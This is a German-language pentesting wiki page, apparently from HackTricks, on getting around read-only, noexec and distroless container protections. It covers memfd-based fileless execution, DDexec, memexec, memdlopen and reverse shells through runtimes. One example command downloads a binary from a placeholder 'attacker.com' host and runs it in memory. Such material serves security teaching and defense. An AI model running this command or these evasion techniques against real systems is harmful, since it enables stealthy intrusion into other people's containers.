# FS-Schutzmaßnahmen umgehen: read-only / no-exec / Distroless

## Videos

In den folgenden Videos werden die auf dieser Seite erwähnten Techniken ausführlicher erklärt:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec-Szenario

In einem Container kann das Root-Dateisystem als read-only eingebunden werden, indem **`readOnlyRootFilesystem: true`** im Security Context gesetzt wird.<sup>[[3]](#references)</sup> Zum Beispiel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ein read-only Root-Dateisystem macht separat eingebundene Volumes nicht read-only. Docker behandelt **`/dev/shm`** als IPC-Mount, während tmpfs-Optionen wie `rw` und `noexec` Laufzeitkonfigurationsoptionen sind. Prüfe die Mount-Optionen des Zielcontainers, bevor du dich auf eines dieser Verhaltensweisen verlässt.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Aus Red-Team-Perspektive kann diese Kombination das Herunterladen und Ausführen von Binärdateien erschweren, die nicht bereits verfügbar sind, beispielsweise Backdoors oder Enumeration-Tools.<sup>[[4]](#references)[[5]](#references)</sup>

## Einfachster Bypass: Scripts

Ein `noexec`-Mount blockiert die direkte Ausführung von Binärdateien auf diesem Mount, aber ein Interpreter kann ein Script weiterhin lesen und interpretieren. Wenn `sh` oder `python` vorhanden ist, kannst du daher ein Shell- oder Python-Script über diesen Interpreter ausführen.<sup>[[5]](#references)</sup>

Das hilft nicht, wenn das benötigte Tool selbst eine Binärdatei ist.<sup>[[5]](#references)</sup>

## Memory-Bypasses

Wenn die direkte Ausführung von einem eingebundenen Pfad blockiert wird, besteht eine Möglichkeit darin, das ELF in den Speicher zu laden und es über einen In-Memory-Pfad auszuführen. Dadurch wird die `noexec`-Prüfung auf diesem Mount umgangen, andere Kernel-, Berechtigungs- oder Policy-Kontrollen werden jedoch nicht entfernt.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec-Syscall-Bypass

Wenn eine Scripting-Runtime auf die relevante Linux-Schnittstelle zugreifen kann, kann sie mit **`memfd_create(2)`** einen anonymen, RAM-basierten File Descriptor erstellen, die ELF-Bytes hineinschreiben und einen FD-basierten Ausführungspfad verwenden. Das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) erzeugt komprimierten und base64-kodierten Python-, Perl- oder Ruby-Code für diesen Workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Das Projekt dokumentiert derzeit Python-, Perl- und Ruby-Ziele. Für PHP oder Node ist eine andere runtime-spezifische Technik oder Extension erforderlich. Das Fehlen dieses Generators für eine Sprache bedeutet daher nicht, dass eine In-Memory-Ausführung unmöglich ist.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Eine reguläre ausführbare Datei, die nach **`/dev/shm`** geschrieben wird, unterliegt weiterhin der **`noexec`**-Einstellung dieses Mounts. Das bloße Öffnen über einen gewöhnlichen File Descriptor ändert die Mount-Policy nicht.<sup>[[5]](#references)</sup>
>
> Die genaue Methode zur Speicherausführung hängt außerdem von der Runtime, der Architektur, dem Kernel und den verfügbaren Berechtigungen ab.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) schreibt einen Stager und Loader über **`/proc/self/mem`** in den laufenden Shell-Prozess und übergibt anschließend die Kontrolle an diesen Code.<sup>[[8]](#references)</sup>

Dadurch kann der Prozess eine bereitgestellte Binärdatei laden, ohne diese zuvor auf einem ausführbaren Dateisystem abzulegen.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** kann Shellcode oder eine Binärdatei aus dem **Speicher** laden und **ausführen**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Weitere Informationen zu dieser Technik findest du auf Github oder:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist eine daemonisierte DDexec-Implementierung. Sein Daemon wartet auf Anfragen mit Argumenten und rohen Programbytes, forkt einen Child-Prozess, um jedes Programm zu laden und auszuführen, und lässt den Parent als Server weiterlaufen.<sup>[[9]](#references)</sup>

Das Repository enthält ein Beispiel für die Verwendung von **memexec zur Ausführung von Binaries aus einer PHP reverse shell** in [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ist [**memdlopen**](https://github.com/arget13/memdlopen) eine fileless-Implementierung von `dlopen()` für ein Shared Object oder Programm. Die README dokumentiert derzeit ARM64-Support; überprüfe daher vor der Verwendung die Zielarchitektur.<sup>[[10]](#references)</sup>

## Distroless Bypass

Eine ausführliche Erklärung dazu, **was distroless tatsächlich ist**, wann es hilft, wann nicht und wie es die Post-Exploitation-Praxis in Containern verändert, findest du hier:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Was ist distroless?

Distroless-Images enthalten nur die Anwendung und ihre Runtime-Abhängigkeiten; die offiziellen Images verzichten auf Package-Manager, Shells und andere Programme, die in einer standardmäßigen Linux-Distribution erwartet werden.<sup>[[11]](#references)</sup>

Indem das Runtime-Image auf diese Abhängigkeiten beschränkt wird, reduziert sich die in der Produktion vorhandene Software sowie die Menge, die gescannt und nachverfolgt werden muss.<sup>[[11]](#references)</sup>

### Reverse Shell

In einem distroless-Container findest du möglicherweise **kein `sh` oder `bash`** für eine reguläre Shell und auch keine gängigen Utilities wie `ls`, `whoami` oder `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Daher funktionieren eine gewöhnliche Shell-basierte reverse shell oder eine auf Utilities basierende Enumeration möglicherweise nicht.<sup>[[11]](#references)</sup>

Wenn die kompromittierte Anwendung eine Language-Runtime enthält, beispielsweise Python für eine Flask-Anwendung oder Node.js für eine Node-Anwendung, kann eine RCE diese Runtime möglicherweise weiterhin für einen Command Channel und die Systeminspektion über ihre APIs verwenden.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Verwende die verfügbare Scripting-Sprache, um **das System zu enumerieren**, indem du ihre Sprachfunktionen nutzt.<sup>[[12]](#references)</sup>

Wenn keine **read-only/no-exec**-Schutzmechanismen vorhanden sind, kann ein Command Channel Binaries auf ein beschreibbares, ausführbares Mount schreiben und sie ausführen; überprüfe zuerst die Mount-Optionen und Berechtigungen.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Wenn diese Schutzmechanismen vorhanden sind, verwende die **Memory-Execution-Techniken weiter oben**, soweit Runtime, Kernel und Berechtigungen dies zulassen.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Beispiele für das Ausnutzen von RCE-Schwachstellen, um **reverse shells** in Scripting-Sprachen zu erhalten und Binaries aus dem Speicher auszuführen, findest du in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Erkundung der Linux-Speichermanipulation für Stealth und Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth-Intrusionen mit DDexec-ng & In-Memory-dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Einen Security Context für einen Pod oder Container konfigurieren](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
